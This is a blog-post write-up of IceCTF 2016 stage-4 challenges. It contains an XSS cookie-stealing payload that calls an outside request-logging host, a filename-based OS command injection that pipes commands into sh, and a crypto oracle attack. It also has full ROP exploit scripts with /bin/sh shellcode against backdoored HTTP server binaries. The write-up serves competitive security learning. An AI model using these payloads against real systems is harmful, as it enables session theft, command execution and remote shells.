---
layout: post
redirect_from:
  - /blog/2016/08/27/icectf-2016-stage4/
date: "2016-08-27T01:22:17+09:00"
tags: [ "ctf", "writeup", "icectf" ]
"target_url": [ "https://icec.tf/" ]
---

# IceCTF 2016: stage4

## ImgBlog

<small>
[@tukejonny](https://twitter.com/tukejonny) did the OS command injection.
</small>

The service has $2$ vulnerabilities.
The first one is XSS, the second one is OS command injection.

After logging in, the `Report Comment` feature (and the individual comment page) has XSS.
Using <http://requestb.in>,

``` html
<script> location.href = "http://requestb.in/xxxxxxxx?" + document.cookie; </script>
```

and the result was:

```
GET /ssf1giss?session=eyJ1c2VyIjoxfQ.Cp3EEg.pisHXEaPJs2TdTCIUI2d5EbhKXE

QUERYSTRING
session: eyJ1c2VyIjoxfQ.Cp3EEg.pisHXEaPJs2TdTCIUI2d5EbhKXE

HEADERS
Via: 1.1 vegur
X-Request-Id: 4097be85-7f30-4431-8a98-6723d4af6cc8
Accept-Encoding: gzip
Accept-Language: en,*
Referer: http://127.0.0.1:5300/comment/99e0f33a39bad91b54e1e3c9ff59b4
Cf-Visitor: {"scheme":"http"}
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Host: requestb.in
Total-Route-Time: 0
Connect-Time: 0
Cf-Ipcountry: US
Cf-Ray: 2d6e33b9459d2567-ORD
Cf-Connecting-Ip: 104.154.248.13
Connection: close
```

Now, you can log in the site as an admin, using the session `eyJ1c2VyIjoxfQ.Cp3EEg.pisHXEaPJs2TdTCIUI2d5EbhKXE`.

However the flag is not appeared, and there is an `Upload` feature.
If you uploads a file, the server `file`s it to check that it is an image file. And if not image, then the server prints the result. i.e.

``` sh
$ curl http://imgblog.vuln.icec.tf/upload -H 'Cookie: session=eyJ1c2VyIjoxfQ.Cp3EEg.pisHXEaPJs2TdTCIUI2d5EbhKXE' -F title=title -F image=@foo.txt -F blogtext=blogtext
...
/uploads/footxt: ASCII text
...
```

Also, around the `file` command, you can do OS command injection.
You cannot use `.`, since this is removed by the server.
So you should use base64 or wildcards like `flag?txt` or `flag*`.

``` sh
$ curl http://imgblog.vuln.icec.tf/upload -H 'Cookie: session=eyJ1c2VyIjoxfQ.Cp3EEg.pisHXEaPJs2TdTCIUI2d5EbhKXE' -H 'Content-Type: multipart/form-data; boundary=----FormBoundary' --data-binary $'------FormBoundary\r\nContent-Disposition: form-data; name="title"\r\n\r\ntitle\r\n------FormBoundary\r\nContent-Disposition: form-data; name="image"; filename="; id; echo '$(echo cat flag.txt | base64)$' | base64 -d | sh;"\r\nContent-Type: image/png\r\n\r\nfoo\r\n------FormBoundary\r\nContent-Disposition: form-data; name="blogtext"\r\n\r\nblogtext\r\n------FormBoundary--\r\n'
```

(Please tell me it if you know a better way to do such a thing. The command opitons are too long and not smart...)

## Quine II

Most of this is the same as the previous problem Quine.
This has a restriction to the size of echo-back, but this restriction is not very tight.
Although the original one is a bit fun, but I feel this is unnecessary.

`IceCTF{my_f1x3d_p0inT_br1nGs_alL_th3_n00bs_t0_th3_y4rD}`.

``` python
#!/usr/bin/env python2
import re
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='quine.vuln.icec.tf')
parser.add_argument('port', nargs='?', default=5501, type=int)
args = parser.parse_args()

quote = lambda s: s.replace('\\', '\\\\').replace('"', '\\"').replace('\n', '\\n')

a = '''\
#include<stdio.h>
#include<stdlib.h>
#include<dirent.h>
char*code="'''

b = ''
b += '''";
void quote(char*s) {
 for (; *s; ++ s) {
  switch (*s) {
   case '\\\\': printf("\\\\\\\\"); break;
   case '"':    printf("\\\\\\"");  break;
   case '\\n':  printf("\\\\n");    break;
   default:     printf("%c", *s);   break;
  }
 }
}
void quine(void) {
 char *s = code;
 for (; *s; ++ s) {
  if (s[0] == '@' && s[1] == '@') {
    quote(code);
    ++ s;
  } else {
    printf("%c", *s);
  }
 }
}
'''

# b += '''
'''
void ls(char *s) {
 DIR *dir = opendir(s);
 struct dirent *ent;
 int i = 0;
 for(; (ent = readdir(dir)); ++ i) {
  char *t = ent->d_name;
  if (t[0] == '1' && t[1] == '4') continue;
  printf("%s ", t);
 }
}
'''

b += '''
void cat(char *s) {
 FILE *fh;
 char buf[64];
 fh = fopen(s, "r");
 fgets(buf, sizeof(buf), fh);
 *strchr(buf, '\\n') = '\\0';
 printf("%s ", buf);
}
'''


b += '''
int main(void) {
 quine();
 printf("\\n// ");
'''

# b += ' printf("%s ", getenv("PWD"));'
# b += ' ls(".");'
# b += ' ls("..");'
b += ' cat("../flag.txt");'

b += '''
 return 0;
}
'''
b = re.sub('^ +', '', b)
b = re.sub(' +$', '', b)
b = re.sub(' +', ' ', b)
b = re.sub('([^\w\s]) +', '\\1', b)
b = re.sub(' +([^\w\s])', '\\1', b)
b = b.replace('\n', '')

code = '{}{}@@{}{}'.format(a, quote(a), quote(b), b)

p = remote(args.host, args.port)
p.recvline()
p.sendline(code)
p.sendline('.')
print(p.recvall())
```

## Flagstaff

According to the `server.py`, you can get the flag using the plaintext whose ciphertext contains the substring `flag`.
You can get the ciphertext for any plaintext, so you can get such a plaintext using approximately $256^4$ queries.
It's a bit large for encryption via network.

You can use differential cryptanalysis. The difference of the front of ciphertext only affects the same place of the plaintext. For example:

``` sh
$ ( echo decrypt ; echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA | base64 ) | nc flagstaff.vuln.icec.tf 6003 | grep -v Welcome | sed 's/.*: //g' | base64 -d | xxd
00000000: cc27 fdeb 2bd0 407c e13b 2626 75ec 7fc0  .'..+.@|.;&&u...
$ ( echo decrypt ; echo BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA | base64 ) | nc flagstaff.vuln.icec.tf 6003 | grep -v Welcome | sed 's/.*: //g' | base64 -d | xxd
00000000: cf27 fdeb 2bd0 407c e13b 2626 75ec 7fc0  .'..+.@|.;&&u...
```

Using this, you can get the ciphertext for the flag with at most $256 \times 4$ queries and get `IceCTF{reverse_all_the_blocks_and_get_to_the_meaning_behind}`.

``` python
#!/usr/bin/env python2
import base64
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='flagstaff.vuln.icec.tf')
parser.add_argument('port', nargs='?', default=6003, type=int)
args = parser.parse_args()

def zeropad(s):
    return s + '\0' * (- len(s) % 32)

def decrypt(ciphertext):
    p = remote(args.host, args.port)
    p.recvuntil('Send me a command: ')
    p.sendline('decrypt')
    p.recvuntil('Send me some data to decrypt: ')
    p.sendline(base64.b64encode(ciphertext))
    plaintext = base64.b64decode(p.recvline())
    log.info('decrypt: %s |-> %s', repr(ciphertext), repr(plaintext))
    p.close()
    return plaintext

# search
ciphertext = ''
target = 'flag'
for i in range(len(target)):
    for c in range(256):
        s = decrypt(zeropad(ciphertext + chr(c)))
        if s[i] == target[i]:
            ciphertext += chr(c)
            break

# secret flag
p = remote(args.host, args.port)
p.recvuntil('Send me a command: ')
p.sendline('secret')
p.recvuntil('Send me an encrypted command: ')
p.sendline(base64.b64encode(zeropad(ciphertext)))
flag = base64.b64decode(p.recvline())
log.info('encrypted flag: %s', repr(flag))
p.close()

# decrypt flag
flag = decrypt(flag)
log.info('flag: %s', flag)
```

## Slickserver

The binary is based on <https://github.com/nemasu/asmttpd>, a HTTP server using threads.

The backdoor using HMAC is added.
If you uses the buffer overflow vulnerability for this and rewrite the flag on `rbp-0x20`, it computes the HMAC value of the payload and jump to the place given as a xor value of the HMAC value and the integer on `rbp-0x20`.

``` asm
0000000000401010 <worker_thread_continue>:
  401010:	48 8b 7d f8          	mov    rdi,QWORD PTR [rbp-0x8] # fd
  401014:	48 8b 75 f0          	mov    rsi,QWORD PTR [rbp-0x10] # buf
  401018:	48 c7 c2 00 20 00 00 	mov    rdx,0x2000 # len
  40101f:	e8 93 f9 ff ff       	call   4009b7 <sys_recv>
  401024:	48 83 f8 00          	cmp    rax,0x0
  401028:	0f 8e 74 03 00 00    	jle    4013a2 <worker_thread_close>
  40102e:	50                   	push   rax
  40102f:	4c 8b 6d e0          	mov    r13,QWORD PTR [rbp-0x20] # backdoor flag
  401033:	4d 85 ed             	test   r13,r13
  401036:	74 0f                	je     401047 <worker_thread_continue_nohook>
  401038:	48 8b 7d f0          	mov    rdi,QWORD PTR [rbp-0x10] # buf
  40103c:	e8 a3 fd ff ff       	call   400de4 <hmac>
  401041:	49 31 c5             	xor    r13,rax
  401044:	41 ff e5             	jmp    r13
```

Now, you can do ROP and get the flag `IceCTF{r0p+z3-FTW}`.

I fix the socket fd as $5$, and construct a gadget dynamically.
Even if it works locally, long chains didn't work on the server. You need to golf a little.

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='slick.vuln.icec.tf')
parser.add_argument('port', nargs='?', default=6600, type=int)
args = parser.parse_args()
context.log_level = 'debug'
context.arch = 'amd64'

mov_rdi_rcx_al_stackpop_ret = 0x00400100 # mov byte [rdi+rcx], al ; pop rbx ; pop rcx ; pop r8 ; pop rcx ; pop rbx ; pop r9 ; pop r10 ; pop rdx ; pop rsi ; pop rdi ; ret
pop_rdi_rcx_mov_rax_r14_ret = 0x00400c9b # pop rdi ; pop rcx ; mov rax, r14 ; ret
mov_eax_esi_ret = 0x00400c9e # mov eax, esi ; ret
pop_rdx_rsi_rdi_ret = 0x0040010d # pop rdx ; pop rsi ; pop rdi ; ret
pop_rsi_rdi_ret = 0x0040010e # pop rsi ; pop rdi ; ret
pop_rdi_ret = 0x0040010f # pop rdi ; ret
ret = 0x400110 # ret
sleep_loop = 0x400fcc # mov rdi, 10 ; call sys_sleep ; jmp $-14
static = 0x601000
shellcode_addr = static + 0xccc
mov_rdi_rsi_ret = static + 0x9cc

mov_rdi_rsi_ret_asm = asm('mov qword ptr [rdi], rsi ; ret')

sockfd = 5 # ?
shellcode = ''
for fd in [0, 1, 2]:
    shellcode += asm('mov rax, SYS_dup2')
    shellcode += asm('mov rdi, %d' % sockfd)
    shellcode += asm('mov rsi, %d' % fd)
    shellcode += asm('syscall')
shellcode += asm('mov rax, SYS_execve')
shellcode += asm('mov rbx, 0x%x' % u64('/bin/sh\0'))
shellcode += asm('push rbx')
shellcode += asm('mov rdi, rsp')
shellcode += asm('push 0')
shellcode += asm('mov rdx, rsp')
shellcode += asm('push rdi')
shellcode += asm('mov rsi, rsp')
shellcode += asm('syscall')

payload = ''
# construct a better gadget using a heavy one
def write(addr, s):
    payload = ''
    for i in range(len(s)):
        if i == 0:
            payload += p64(pop_rsi_rdi_ret)
            payload += p64(ord(s[i])) # rsi -> eax
            payload += 'AAAAAAAA' # rdi
            payload += p64(pop_rdi_rcx_mov_rax_r14_ret)
            payload += p64(addr) # rdi
            payload += p64(i) # rcx
            payload += p64(mov_eax_esi_ret)
        payload += p64(mov_rdi_rcx_al_stackpop_ret)
        payload += 'AAAAAAAA' # rbx
        payload += 'AAAAAAAA' # rcx
        payload += 'AAAAAAAA' # r8
        payload += p64(i+1) # rcx
        payload += 'AAAAAAAA' # rbx
        payload += 'AAAAAAAA' # r9
        payload += 'AAAAAAAA' # r10
        payload += 'AAAAAAAA' # rdx
        payload += p64(ord(s[i+1])) if i+1 < len(s) else 'BBBBBBBB' # rsi
        payload += p64(addr) # rdi
        payload += p64(mov_eax_esi_ret)
    return payload
payload += write(mov_rdi_rsi_ret, mov_rdi_rsi_ret_asm)
# write shellcode using the new gadget
def write(addr, s):
    s += '\0' * (- len(s) % 8)
    payload = ''
    for i in range(0, len(s), 8):
        payload += p64(pop_rsi_rdi_ret)
        payload += s[i : i+8]
        payload += p64(addr + i)
        payload += p64(mov_rdi_rsi_ret)
    return payload
payload += write(shellcode_addr, shellcode)
# jump to the shellcode
payload += p64(shellcode_addr)

# set the values for the backdoor using hmac
hmac_addr = 0x601510 # .data, strings part
hmac_value = 0xa2928adbd046983b
while len(payload) < 1000 - 8*3:
    payload += p64(ret)
payload += 'AAAAAAAA'
payload += 'BBBBBBBB'
payload += 'CCCCCCCC'
assert len(payload) == 1000
payload += p64(hmac_value ^ pop_rdi_ret)
payload += 'DDDDDDDD'
payload += p64(hmac_addr)
payload += '*SOCKET*' # the sockfd here
assert len(payload) < 8192

p = remote(args.host, args.port)
p.send(payload)
time.sleep(1)
p.sendline('id')
p.interactive()
```

## Slickerserver

The fixed Slickserver. This time, we should calculate the inverse of the `hmac` to use the backdoor.
Things except this is same to the previous one, and ROP gadgets is more rich.

To crack the `hmac` function, I used the [z3](https://github.com/Z3Prover/z3).
The previous flag `IceCTF{r0p+z3-FTW}` was a hint.
<https://wiki.mma.club.uec.ac.jp/CTF/Toolkit/z3py> (in Japanese) is a good page about z3, and you should take care about the `>>` operator of z3 (see the code below).

`IceCTF{m4ster1ng_the_4rt_of_f1x3d_p0ints}`.

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='slick.vuln.icec.tf')
parser.add_argument('port', nargs='?', default=6601, type=int)
args = parser.parse_args()
context.log_level = 'debug'
context.arch = 'amd64'

def xorsum(s): # with u64
    assert len(s) % 8 == 0
    x = 0
    for i in range(0, len(s), 8):
        x ^= u64(s[i : i+8])
    return x

def murmur1(ys, k, shift=(lambda x, y: x >> y), hook=(lambda x: x)):
    m64 = lambda x: x & 0xffffffffffffffff
    x = hook(m64(len(ys) * 8 * 0xa165c8277) ^ k)
    for y in ys:
        x = hook(m64(x + y))
        x = hook(m64(x * 0xa165c8277))
        x = hook(shift(x, 16) ^ x) # in the z3py, the __rshift__ operator `>>' is interpreted as signed shift and this causes failure
    x = hook(m64(x * 0xa165c8277))
    x = hook(shift(x, 10) ^ x)
    x = hook(m64(x * 0xa165c8277))
    x = hook(shift(x, 17) ^ x)
    return x

def hmac(s, shift=(lambda x, y: x >> y), hook=(lambda x: x)):
    if isinstance(s, str):
        assert len(s) == 0x5e8
        sm = xorsum(s)
        k1 = u64(s[0x5d8 : 0x5e0])
        k2 = u64(s[0x5e0 : 0x5e8])
    else:
        sm, k1, k2 = s
    x = murmur1([sm ^ 0x5c5c5c5c5c5c5c5c, k1, k2], 0x0defacedbaadf00d, shift=shift, hook=hook)
    y = murmur1([0x3636363636363636, x],           0xfaceb00ccafebabe, shift=shift, hook=hook)
    return y

def unhmac(value):
    import z3
    sm = z3.BitVec('sm', 64)
    k1 = z3.BitVec('k1', 64)
    k2 = z3.BitVec('k2', 64)
    solver = z3.Solver()
    def newvar(x, i=[0]):
        y = z3.BitVec('t.' + str(i[0]), 64)
        i[0] += 1
        solver.add(y == x)
        return y
    solver.add(hmac([sm, k1, k2], shift=z3.LShR, hook=newvar) == value)
    solver.check()
    model = solver.model()
    sm = int(model[sm].as_long())
    k1 = int(model[k1].as_long())
    k2 = int(model[k2].as_long())
    return sm, k1, k2

pop_rsi_rdi_ret = 0x40011b # pop rsi ; pop rdi ; ret
mov_eax_esi_ret = 0x400e99 # mov eax, esi ; ret
pop_rcx_mov_rax_r14_ret = 0x00400e97 # pop rcx ; mov rax, r14 ; ret
add_rax_cl_ret = 0x401387 # add byte ptr [rax - 0x39], cl ; ret 0
pop_rdi_ret = 0x0040011c # pop rdi ; ret
static = 0x601000
shellcode_addr = static + 0xccc
mov_rdi_rsi_ret = static + 0xbbb

mov_rdi_rsi_ret_asm = asm('mov qword ptr [rdi], rsi ; ret')

shellcode = ''
for fd in [0, 1, 2]:
    shellcode += asm('mov rax, SYS_dup2')
    shellcode += asm('mov rdi, [rbp-0x8]')
    shellcode += asm('mov rsi, %d' % fd)
    shellcode += asm('syscall')
shellcode += asm('mov rax, SYS_execve')
shellcode += asm('mov rbx, 0x%x' % u64('/bin/sh\0'))
shellcode += asm('push rbx')
shellcode += asm('mov rdi, rsp')
shellcode += asm('push 0')
shellcode += asm('mov rdx, rsp')
shellcode += asm('push rdi')
shellcode += asm('mov rsi, rsp')
shellcode += asm('syscall')

hmac_result = pop_rdi_ret
hmac_keys = None
# hmac_keys = ( 0x0000000000000000, 0x5640a3545cc47728, 0xc7c237690640b388 )
if hmac_keys is None:
    hmac_keys = unhmac(hmac_result) # this took 20sec on my environment.
    log.info('hmac keys: ( 0x%016x, 0x%016x, 0x%016x )', *hmac_keys)
assert hmac(hmac_keys) == hmac_result

payload = ''
# construct a better gadget using a heavy one
def write(addr, s):
    payload = ''
    for i, c in enumerate(s):
        payload += p64(pop_rcx_mov_rax_r14_ret)
        payload += p64(ord(c))
        payload += p64(pop_rsi_rdi_ret)
        payload += p64(addr + i + 0x39)
        payload += 'AAAAAAAA'
        payload += p64(mov_eax_esi_ret)
        payload += p64(add_rax_cl_ret)
    return payload
payload += write(mov_rdi_rsi_ret, mov_rdi_rsi_ret_asm)
# write shellcode using the new gadget
def write(addr, s):
    s += '\0' * (- len(s) % 8)
    payload = ''
    for i in range(0, len(s), 8):
        payload += p64(pop_rsi_rdi_ret)
        payload += s[i : i+8]
        payload += p64(addr + i)
        payload += p64(mov_rdi_rsi_ret)
    return payload
payload += write(shellcode_addr, shellcode)
# jump to the shellcode
payload += p64(shellcode_addr)
# set the values for the backdoor using hmac
payload += 'A' * (1520 - len(payload) - 8*4)
payload += p64(xorsum(payload) ^ hmac_keys[0] ^ hmac_keys[1] ^ hmac_keys[2])
payload += p64(hmac_keys[1])
payload += p64(hmac_keys[2])
payload += p64(1) # set the flag
assert len(payload) == 1520

p = remote(args.host, args.port)
p.send(payload)
time.sleep(1)
p.sendline('id')
p.interactive()
```
